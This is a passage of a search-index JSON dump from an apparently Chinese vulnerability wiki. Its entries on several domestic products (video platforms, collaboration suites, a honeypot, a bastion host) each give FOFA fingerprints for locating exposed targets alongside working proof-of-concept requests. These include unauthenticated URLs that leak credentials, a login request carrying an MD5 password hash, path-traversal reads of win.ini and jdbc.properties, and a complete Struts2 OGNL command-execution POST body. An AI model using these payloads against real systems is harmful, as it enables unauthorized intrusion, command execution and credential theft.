","date":"0001-01-01","objectID":"/%E9%98%BF%E5%B0%94%E6%B3%95%E7%A7%91%E6%8A%80-%E8%99%9A%E6%8B%9F%E4%BB%BF%E7%9C%9F%E5%AE%9E%E9%AA%8C%E5%AE%A4-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E9%98%BF%E5%B0%94%E6%B3%95%E7%A7%91%E6%8A%80-%E8%99%9A%E6%8B%9F%E4%BB%BF%E7%9C%9F%E5%AE%9E%E9%AA%8C%E5%AE%A4-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 阿尔法科技 虚拟仿真实验室 存在未授权访问漏洞，通过访问构造的Url可以获取敏感信息 ","date":"0001-01-01","objectID":"/%E9%98%BF%E5%B0%94%E6%B3%95%E7%A7%91%E6%8A%80-%E8%99%9A%E6%8B%9F%E4%BB%BF%E7%9C%9F%E5%AE%9E%E9%AA%8C%E5%AE%A4-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E9%98%BF%E5%B0%94%E6%B3%95%E7%A7%91%E6%8A%80-%E8%99%9A%E6%8B%9F%E4%BB%BF%E7%9C%9F%E5%AE%9E%E9%AA%8C%E5%AE%A4-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 虚拟仿真实验室 ","date":"0001-01-01","objectID":"/%E9%98%BF%E5%B0%94%E6%B3%95%E7%A7%91%E6%8A%80-%E8%99%9A%E6%8B%9F%E4%BB%BF%E7%9C%9F%E5%AE%9E%E9%AA%8C%E5%AE%A4-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E9%98%BF%E5%B0%94%E6%B3%95%E7%A7%91%E6%8A%80-%E8%99%9A%E6%8B%9F%E4%BB%BF%E7%9C%9F%E5%AE%9E%E9%AA%8C%E5%AE%A4-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 body=\"河南阿尔法科技有限公司\" ","date":"0001-01-01","objectID":"/%E9%98%BF%E5%B0%94%E6%B3%95%E7%A7%91%E6%8A%80-%E8%99%9A%E6%8B%9F%E4%BB%BF%E7%9C%9F%E5%AE%9E%E9%AA%8C%E5%AE%A4-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E9%98%BF%E5%B0%94%E6%B3%95%E7%A7%91%E6%8A%80-%E8%99%9A%E6%8B%9F%E4%BB%BF%E7%9C%9F%E5%AE%9E%E9%AA%8C%E5%AE%A4-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 未授权的Url为 /admin/student/studentlist.html?page=1 成功获取所有用户的账号密码信息 ","date":"0001-01-01","objectID":"/%E9%98%BF%E5%B0%94%E6%B3%95%E7%A7%91%E6%8A%80-%E8%99%9A%E6%8B%9F%E4%BB%BF%E7%9C%9F%E5%AE%9E%E9%AA%8C%E5%AE%A4-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E9%98%BF%E5%B0%94%E6%B3%95%E7%A7%91%E6%8A%80-%E8%99%9A%E6%8B%9F%E4%BB%BF%E7%9C%9F%E5%AE%9E%E9%AA%8C%E5%AE%A4-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"参考文章 http://www.0dayhack.net/index.php/1702/ ","date":"0001-01-01","objectID":"/%E9%98%BF%E5%B0%94%E6%B3%95%E7%A7%91%E6%8A%80-%E8%99%9A%E6%8B%9F%E4%BB%BF%E7%9C%9F%E5%AE%9E%E9%AA%8C%E5%AE%A4-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:5:0","tags":null,"title":"","uri":"/%E9%98%BF%E5%B0%94%E6%B3%95%E7%A7%91%E6%8A%80-%E8%99%9A%E6%8B%9F%E4%BB%BF%E7%9C%9F%E5%AE%9E%E9%AA%8C%E5%AE%A4-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"零视科技 H5S视频平台 GetUserInfo 信息泄漏漏洞 CNVD-2020-67113 ","date":"0001-01-01","objectID":"/%E9%9B%B6%E8%A7%86%E7%A7%91%E6%8A%80-h5s%E8%A7%86%E9%A2%91%E5%B9%B3%E5%8F%B0-getuserinfo-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cnvd-2020-67113/:0:0","tags":null,"title":"","uri":"/%E9%9B%B6%E8%A7%86%E7%A7%91%E6%8A%80-h5s%E8%A7%86%E9%A2%91%E5%B9%B3%E5%8F%B0-getuserinfo-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cnvd-2020-67113/"},{"categories":null,"content":"漏洞描述 零视技术(上海)有限公司是以领先的视频技术服务于客户，致力于物联网视频开发简单化，依托于HTML5 WebRTC 等新的技术，实现全平台视频播放简单化。 零视技术(上海)有限公司H5S CONSOLE存在未授权访问漏洞。攻击者可利用漏洞访问后台相应端口，执行未授权操作。 ","date":"0001-01-01","objectID":"/%E9%9B%B6%E8%A7%86%E7%A7%91%E6%8A%80-h5s%E8%A7%86%E9%A2%91%E5%B9%B3%E5%8F%B0-getuserinfo-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cnvd-2020-67113/:1:0","tags":null,"title":"","uri":"/%E9%9B%B6%E8%A7%86%E7%A7%91%E6%8A%80-h5s%E8%A7%86%E9%A2%91%E5%B9%B3%E5%8F%B0-getuserinfo-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cnvd-2020-67113/"},{"categories":null,"content":"漏洞影响 零视科技 H5S视频平台 ","date":"0001-01-01","objectID":"/%E9%9B%B6%E8%A7%86%E7%A7%91%E6%8A%80-h5s%E8%A7%86%E9%A2%91%E5%B9%B3%E5%8F%B0-getuserinfo-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cnvd-2020-67113/:2:0","tags":null,"title":"","uri":"/%E9%9B%B6%E8%A7%86%E7%A7%91%E6%8A%80-h5s%E8%A7%86%E9%A2%91%E5%B9%B3%E5%8F%B0-getuserinfo-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cnvd-2020-67113/"},{"categories":null,"content":"网络测绘 title=\"H5S视频平台|WEB\" ","date":"0001-01-01","objectID":"/%E9%9B%B6%E8%A7%86%E7%A7%91%E6%8A%80-h5s%E8%A7%86%E9%A2%91%E5%B9%B3%E5%8F%B0-getuserinfo-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cnvd-2020-67113/:3:0","tags":null,"title":"","uri":"/%E9%9B%B6%E8%A7%86%E7%A7%91%E6%8A%80-h5s%E8%A7%86%E9%A2%91%E5%B9%B3%E5%8F%B0-getuserinfo-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cnvd-2020-67113/"},{"categories":null,"content":"漏洞复现 登录页面 API文档可以未授权访问 /doc/api.html 存在用户账号密码泄漏的接口 /api/v1/GetUserInfo?user=admin\u0026session= 其中登录接口中 Password为接口中存在的账号密码，可以直接发送请求获取Cookie /api/v1/Login?user=admin\u0026password=827ccb0eea8a706c4c34a16891f84e7b 请求成功后访问主页面 ","date":"0001-01-01","objectID":"/%E9%9B%B6%E8%A7%86%E7%A7%91%E6%8A%80-h5s%E8%A7%86%E9%A2%91%E5%B9%B3%E5%8F%B0-getuserinfo-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cnvd-2020-67113/:4:0","tags":null,"title":"","uri":"/%E9%9B%B6%E8%A7%86%E7%A7%91%E6%8A%80-h5s%E8%A7%86%E9%A2%91%E5%B9%B3%E5%8F%B0-getuserinfo-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cnvd-2020-67113/"},{"categories":null,"content":"霆智科技 VA虚拟应用平台 任意文件读取漏洞 ","date":"0001-01-01","objectID":"/%E9%9C%86%E6%99%BA%E7%A7%91%E6%8A%80-va%E8%99%9A%E6%8B%9F%E5%BA%94%E7%94%A8%E5%B9%B3%E5%8F%B0-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E9%9C%86%E6%99%BA%E7%A7%91%E6%8A%80-va%E8%99%9A%E6%8B%9F%E5%BA%94%E7%94%A8%E5%B9%B3%E5%8F%B0-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 霆智科技 VA虚拟应用平台 存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器中敏感信息 ","date":"0001-01-01","objectID":"/%E9%9C%86%E6%99%BA%E7%A7%91%E6%8A%80-va%E8%99%9A%E6%8B%9F%E5%BA%94%E7%94%A8%E5%B9%B3%E5%8F%B0-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E9%9C%86%E6%99%BA%E7%A7%91%E6%8A%80-va%E8%99%9A%E6%8B%9F%E5%BA%94%E7%94%A8%E5%B9%B3%E5%8F%B0-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 霆智科技 VA虚拟应用平台 ","date":"0001-01-01","objectID":"/%E9%9C%86%E6%99%BA%E7%A7%91%E6%8A%80-va%E8%99%9A%E6%8B%9F%E5%BA%94%E7%94%A8%E5%B9%B3%E5%8F%B0-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E9%9C%86%E6%99%BA%E7%A7%91%E6%8A%80-va%E8%99%9A%E6%8B%9F%E5%BA%94%E7%94%A8%E5%B9%B3%E5%8F%B0-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 body=\"EAA益和应用接入系统\" ","date":"0001-01-01","objectID":"/%E9%9C%86%E6%99%BA%E7%A7%91%E6%8A%80-va%E8%99%9A%E6%8B%9F%E5%BA%94%E7%94%A8%E5%B9%B3%E5%8F%B0-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E9%9C%86%E6%99%BA%E7%A7%91%E6%8A%80-va%E8%99%9A%E6%8B%9F%E5%BA%94%E7%94%A8%E5%B9%B3%E5%8F%B0-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登陆页面 验证POC /..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/windows/win.ini ","date":"0001-01-01","objectID":"/%E9%9C%86%E6%99%BA%E7%A7%91%E6%8A%80-va%E8%99%9A%E6%8B%9F%E5%BA%94%E7%94%A8%E5%B9%B3%E5%8F%B0-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E9%9C%86%E6%99%BA%E7%A7%91%E6%8A%80-va%E8%99%9A%E6%8B%9F%E5%BA%94%E7%94%A8%E5%B9%B3%E5%8F%B0-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"飞企互联 FE业务协作平台 ShowImageServlet 任意文件读取漏洞 ","date":"0001-01-01","objectID":"/%E9%A3%9E%E4%BC%81%E4%BA%92%E8%81%94-fe%E4%B8%9A%E5%8A%A1%E5%8D%8F%E4%BD%9C%E5%B9%B3%E5%8F%B0-showimageservlet-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E9%A3%9E%E4%BC%81%E4%BA%92%E8%81%94-fe%E4%B8%9A%E5%8A%A1%E5%8D%8F%E4%BD%9C%E5%B9%B3%E5%8F%B0-showimageservlet-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 飞企互联 FE业务协作平台 ShowImageServlet 接口存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器中敏感文件 ","date":"0001-01-01","objectID":"/%E9%A3%9E%E4%BC%81%E4%BA%92%E8%81%94-fe%E4%B8%9A%E5%8A%A1%E5%8D%8F%E4%BD%9C%E5%B9%B3%E5%8F%B0-showimageservlet-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E9%A3%9E%E4%BC%81%E4%BA%92%E8%81%94-fe%E4%B8%9A%E5%8A%A1%E5%8D%8F%E4%BD%9C%E5%B9%B3%E5%8F%B0-showimageservlet-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 飞企互联 FE业务协作平台 ","date":"0001-01-01","objectID":"/%E9%A3%9E%E4%BC%81%E4%BA%92%E8%81%94-fe%E4%B8%9A%E5%8A%A1%E5%8D%8F%E4%BD%9C%E5%B9%B3%E5%8F%B0-showimageservlet-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E9%A3%9E%E4%BC%81%E4%BA%92%E8%81%94-fe%E4%B8%9A%E5%8A%A1%E5%8D%8F%E4%BD%9C%E5%B9%B3%E5%8F%B0-showimageservlet-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 \"flyrise.stopBackspace.js\" ","date":"0001-01-01","objectID":"/%E9%A3%9E%E4%BC%81%E4%BA%92%E8%81%94-fe%E4%B8%9A%E5%8A%A1%E5%8D%8F%E4%BD%9C%E5%B9%B3%E5%8F%B0-showimageservlet-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E9%A3%9E%E4%BC%81%E4%BA%92%E8%81%94-fe%E4%B8%9A%E5%8A%A1%E5%8D%8F%E4%BD%9C%E5%B9%B3%E5%8F%B0-showimageservlet-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登陆页面 验证POC /servlet/ShowImageServlet?imagePath=../web/fe.war/WEB-INF/classes/jdbc.properties\u0026print ","date":"0001-01-01","objectID":"/%E9%A3%9E%E4%BC%81%E4%BA%92%E8%81%94-fe%E4%B8%9A%E5%8A%A1%E5%8D%8F%E4%BD%9C%E5%B9%B3%E5%8F%B0-showimageservlet-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E9%A3%9E%E4%BC%81%E4%BA%92%E8%81%94-fe%E4%B8%9A%E5%8A%A1%E5%8D%8F%E4%BD%9C%E5%B9%B3%E5%8F%B0-showimageservlet-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"飞视美 视频会议系统 Struts2 远程命令执行漏洞 ","date":"0001-01-01","objectID":"/%E9%A3%9E%E8%A7%86%E7%BE%8E-%E8%A7%86%E9%A2%91%E4%BC%9A%E8%AE%AE%E7%B3%BB%E7%BB%9F-struts2-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E9%A3%9E%E8%A7%86%E7%BE%8E-%E8%A7%86%E9%A2%91%E4%BC%9A%E8%AE%AE%E7%B3%BB%E7%BB%9F-struts2-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 飞视美 视频会议系统 Struts2组件存在远程命令执行漏洞，通过漏洞攻击者可执行任意命令获取服务器权限 ","date":"0001-01-01","objectID":"/%E9%A3%9E%E8%A7%86%E7%BE%8E-%E8%A7%86%E9%A2%91%E4%BC%9A%E8%AE%AE%E7%B3%BB%E7%BB%9F-struts2-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E9%A3%9E%E8%A7%86%E7%BE%8E-%E8%A7%86%E9%A2%91%E4%BC%9A%E8%AE%AE%E7%B3%BB%E7%BB%9F-struts2-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 飞视美 视频会议系统 ","date":"0001-01-01","objectID":"/%E9%A3%9E%E8%A7%86%E7%BE%8E-%E8%A7%86%E9%A2%91%E4%BC%9A%E8%AE%AE%E7%B3%BB%E7%BB%9F-struts2-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E9%A3%9E%E8%A7%86%E7%BE%8E-%E8%A7%86%E9%A2%91%E4%BC%9A%E8%AE%AE%E7%B3%BB%E7%BB%9F-struts2-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"飞视美-视频会议系统\" ","date":"0001-01-01","objectID":"/%E9%A3%9E%E8%A7%86%E7%BE%8E-%E8%A7%86%E9%A2%91%E4%BC%9A%E8%AE%AE%E7%B3%BB%E7%BB%9F-struts2-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E9%A3%9E%E8%A7%86%E7%BE%8E-%E8%A7%86%E9%A2%91%E4%BC%9A%E8%AE%AE%E7%B3%BB%E7%BB%9F-struts2-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 存在漏洞的路径为 /confinfoaction!showallConfinfos.action 发送请求包 POST /confinfoaction!showallConfinfos.action HTTP/1.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0 Content-Type: application/x-www-form-urlencoded Content-Length: 669 Host: Connection: Keep-Alive ('\\43_memberAccess.allowStaticMethodAccess')(a)=true\u0026(b)(('\\43context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\75false')(b))\u0026('\\43c')(('\\43_memberAccess.excludeProperties\\75@java.util.Collections@EMPTY_SET')(c))\u0026(g)(('\\43mycmd\\75\\'ipconfig\\'')(d))\u0026(h)(('\\43myret\\75@java.lang.Runtime@getRuntime().exec(\\43mycmd)')(d))\u0026(i)(('\\43mydat\\75new\\40java.io.DataInputStream(\\43myret.getInputStream())')(d))\u0026(j)(('\\43myres\\75new\\40byte[51020]')(d))\u0026(k)(('\\43mydat.readFully(\\43myres)')(d))\u0026(l)(('\\43mystr\\75new\\40java.lang.String(\\43myres)')(d))\u0026(m)(('\\43myout\\75@org.apache.struts2.ServletActionContext@getResponse()')(d))\u0026(n)(('\\43myout.getWriter().println(\\43mystr)')(d)) ","date":"0001-01-01","objectID":"/%E9%A3%9E%E8%A7%86%E7%BE%8E-%E8%A7%86%E9%A2%91%E4%BC%9A%E8%AE%AE%E7%B3%BB%E7%BB%9F-struts2-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E9%A3%9E%E8%A7%86%E7%BE%8E-%E8%A7%86%E9%A2%91%E4%BC%9A%E8%AE%AE%E7%B3%BB%E7%BB%9F-struts2-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"魅课 OM视频会议系统 proxy.php 文件包含漏洞 ","date":"0001-01-01","objectID":"/%E9%AD%85%E8%AF%BE-om%E8%A7%86%E9%A2%91%E4%BC%9A%E8%AE%AE%E7%B3%BB%E7%BB%9F-proxy.php-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E9%AD%85%E8%AF%BE-om%E8%A7%86%E9%A2%91%E4%BC%9A%E8%AE%AE%E7%B3%BB%E7%BB%9F-proxy.php-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 魅课OM视频会议系统 proxy.php文件target参数存在本地文件包含漏洞。攻击者可借助该漏洞无需登录便可下载任意文件。 ","date":"0001-01-01","objectID":"/%E9%AD%85%E8%AF%BE-om%E8%A7%86%E9%A2%91%E4%BC%9A%E8%AE%AE%E7%B3%BB%E7%BB%9F-proxy.php-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E9%AD%85%E8%AF%BE-om%E8%A7%86%E9%A2%91%E4%BC%9A%E8%AE%AE%E7%B3%BB%E7%BB%9F-proxy.php-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 魅课OM视频会议系统 ","date":"0001-01-01","objectID":"/%E9%AD%85%E8%AF%BE-om%E8%A7%86%E9%A2%91%E4%BC%9A%E8%AE%AE%E7%B3%BB%E7%BB%9F-proxy.php-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E9%AD%85%E8%AF%BE-om%E8%A7%86%E9%A2%91%E4%BC%9A%E8%AE%AE%E7%B3%BB%E7%BB%9F-proxy.php-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"OMEETING-OM视频会议\" ","date":"0001-01-01","objectID":"/%E9%AD%85%E8%AF%BE-om%E8%A7%86%E9%A2%91%E4%BC%9A%E8%AE%AE%E7%B3%BB%E7%BB%9F-proxy.php-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E9%AD%85%E8%AF%BE-om%E8%A7%86%E9%A2%91%E4%BC%9A%E8%AE%AE%E7%B3%BB%E7%BB%9F-proxy.php-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 验证POC /admin/do/proxy.php?method=get\u0026target=../../../../../../../../../../windows/win.ini ","date":"0001-01-01","objectID":"/%E9%AD%85%E8%AF%BE-om%E8%A7%86%E9%A2%91%E4%BC%9A%E8%AE%AE%E7%B3%BB%E7%BB%9F-proxy.php-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E9%AD%85%E8%AF%BE-om%E8%A7%86%E9%A2%91%E4%BC%9A%E8%AE%AE%E7%B3%BB%E7%BB%9F-proxy.php-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"默安 幻阵蜜罐未授权访问 RCE ","date":"0001-01-01","objectID":"/%E9%BB%98%E5%AE%89-%E5%B9%BB%E9%98%B5%E8%9C%9C%E7%BD%90%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-rce/:0:0","tags":null,"title":"","uri":"/%E9%BB%98%E5%AE%89-%E5%B9%BB%E9%98%B5%E8%9C%9C%E7%BD%90%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-rce/"},{"categories":null,"content":"漏洞描述 默安 幻阵蜜罐存在部署页面未授权访问 ，可执行任意命令 ","date":"0001-01-01","objectID":"/%E9%BB%98%E5%AE%89-%E5%B9%BB%E9%98%B5%E8%9C%9C%E7%BD%90%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-rce/:1:0","tags":null,"title":"","uri":"/%E9%BB%98%E5%AE%89-%E5%B9%BB%E9%98%B5%E8%9C%9C%E7%BD%90%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-rce/"},{"categories":null,"content":"漏洞影响 默安 幻阵蜜罐 ","date":"0001-01-01","objectID":"/%E9%BB%98%E5%AE%89-%E5%B9%BB%E9%98%B5%E8%9C%9C%E7%BD%90%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-rce/:2:0","tags":null,"title":"","uri":"/%E9%BB%98%E5%AE%89-%E5%B9%BB%E9%98%B5%E8%9C%9C%E7%BD%90%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-rce/"},{"categories":null,"content":"漏洞复现 产品页面 安装页面如下 刷新并抓包 Drop掉 /huanzhen/have_installed? 进入页面 点击调试抓包 执行其他命令 点击一键诊断泄露 IP数据 ","date":"0001-01-01","objectID":"/%E9%BB%98%E5%AE%89-%E5%B9%BB%E9%98%B5%E8%9C%9C%E7%BD%90%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-rce/:3:0","tags":null,"title":"","uri":"/%E9%BB%98%E5%AE%89-%E5%B9%BB%E9%98%B5%E8%9C%9C%E7%BD%90%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-rce/"},{"categories":null,"content":"齐治堡垒机 gui_detail_view.php 任意用户登录漏洞 ","date":"0001-01-01","objectID":"/%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA-gui_detail_view.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA-gui_detail_view.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 齐治堡垒机 存在任意用户登录漏洞，访问特定的Url即可获得后台权限 ","date":"0001-01-01","objectID":"/%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA-gui_detail_view.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA-gui_detail_view.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 齐治堡垒机 